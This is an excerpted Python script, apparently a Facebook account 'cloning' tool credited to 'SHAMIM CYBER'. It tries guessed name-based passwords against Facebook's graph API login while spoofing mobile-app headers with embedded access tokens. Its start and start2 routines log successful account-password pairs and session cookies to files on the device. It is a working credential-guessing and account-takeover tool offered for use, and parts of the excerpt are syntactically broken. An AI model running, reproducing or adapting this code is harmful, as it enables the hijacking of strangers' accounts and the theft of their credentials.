...
\033[1;97m
╔═════════════════════════════════════════════════╗
║\033[0;91m [\033[0;92m•\033[0;91m] \033[0;97mDEVELOPER   : SHAMIM CYBER     ║
║\033[0;91m [\033[0;92m•\033[0;91m] \033[0;97mFACEBOOK     : MD Sumon             ║
║\033[0;91m [\033[0;92m•\033[0;91m] \033[0;97mGITHUB           : SHAMIM-FB             ║
║\033[0;91m [\033[0;92m•\033[0;91m] \033[0;97mSTATUS           : FREE           	           ║
║\033[0;91m [\033[0;92m•\033[0;91m] \033[0;97mVERSION         : 0.0.5                          ║
╚═════════════════════════════════════════════════╝
'''
...
def mind():
    ...
    print(f"\033[0;91m[\033[0;97m+\033[0;91m] \033[0;97mGmail Cloning")
    print(f"\033[0;91m[\033[0;97m+\033[0;91m] \033[0;97mBd Random Cloning")
    print(f"\033[0;91m[\033[0;97m+\033[0;91m] \033[0;97mBd Number Cloning")
    print(f"{oo(0)}Exit")
    inpp = input(f"{oo('•')}Choose Option : ")
    if inpp == "1":
        file()
    if inpp == '+':
    	os.system("xdg-open https://www.facebook.com/MR.MIND163")
    if inpp =='3':
        gmail()
    if inpp == "4":
...
def file():
    ...
    if 'gm' in l:
        ...
        file = input(f"{oo('•')}Enter Your File Name : ")
    try:
...
def method():
    ...
    print(logo)
    if 'o':      
        lp = input(f'{oo("•")}Enter Your Password Limit : ')
        if lp.isnumeric():
            ex = 'firstlast, lastfirst, firstlast123, lastfirst123'
            print(f'{oo("•")}{ex} (ETC)')
    ...
    print(logo) 
    print('\033[1;97m─'*50)
    print(f'\033[0;91m [\033[0;92m✓\033[0;91m] \033[0;97mYOUR TOTAL IDS  : \033[1;92m'+str(len(accounts)))
    print(f"\033[0;91m [\033[0;92m✓\033[0;91m] \033[0;97mYOUR OK ID SAVE : SHAMIM-OK.txt")
    print(f"\033[0;91m [\033[0;92m✓\033[0;91m] \033[0;97mYOUR CP ID SAVE : SHAMIM-CP.txt")
    print(f"\033[0;91m [\033[0;92m✓\033[0;91m] \033[0;97mYOUR TO STOP PROCESS PRESS CTRL THEN PRESS Z")
    print(f"\033[0;91m [\033[0;92m✓\033[0;91m] \033[0;97mIF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS")
    print('\033[1;97m─'*50)
    print()
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\r\033[1;97m[\033[1;97mSHAMIM-CYBER-71•M1\033[1;97m]\033[1;97m {}-{} \033[1;91m[\033[1;93m{}\033[1;91m] \033[1;92m[OK : \033[1;92m{}] \033[1;93m- \033[1;91m[CP : \033[1;91m{}]      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = "[FBAN/FB4A;FBAV/{omp}.0.0.8.108;FBPN/com.facebook.katana;FBBV/405428495;FBRV/406295757;FBLC/en_US;FBCR/Telenor;FBMF/realme;FBBD/realme;FBDV/realme;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.98,width=1240,height=2772};FB_FW/1;]"
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92SHAMIM[🥰]-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m||\033[1;92m '+pword+'  ')
                open('/sdcard/SHAMIM[🥰]-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;91SHAMIM[💔]-CP\033[1;91m] \033[1;91m'+acc+' \033[1;91m||\033[1;91m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/SHAMIM[💔]-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;97m[\033[1;97mSHAMIM-CYBER-71•M2\033[1;97m]\033[1;97m {}-{} \033[1;97m[\033[1;93m{}\033[1;97m] \033[1;92m[OK : \033[1;92m{}] \033[1;91m[CP : \033[1;91m{}]      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.114 Mobile Safari/537.36",
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mSHAMIM[🥰]-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m||\033[1;92m '+pword+'  ')
                open('/sdcard/SHAMIM[🥰]-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 ...
                 print('\r\033[1;91m[\033[1;97mCookie\033[1;91m] \033[1;93m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;91SHAMIM[💔]-CP\033[1;91m] \033[1;91m'+acc+' \033[1;91m||\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/SHAMIM[💔]-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
...
def andom():
    ...
    print(f"{oo('•')}/sdcard/SHAMIM[🥰]-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mMIND-XD\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97SHAMIM[🥰]-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/SHAMIM[🥰]-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mSHAMIM[💔]-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/SHAMIM[💔]-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mSHAMIM-CYBER-71•M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.114 Mobile Safari/537.36",
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mSHAMIM[🥰]-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/SHAMIM[🥰]-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
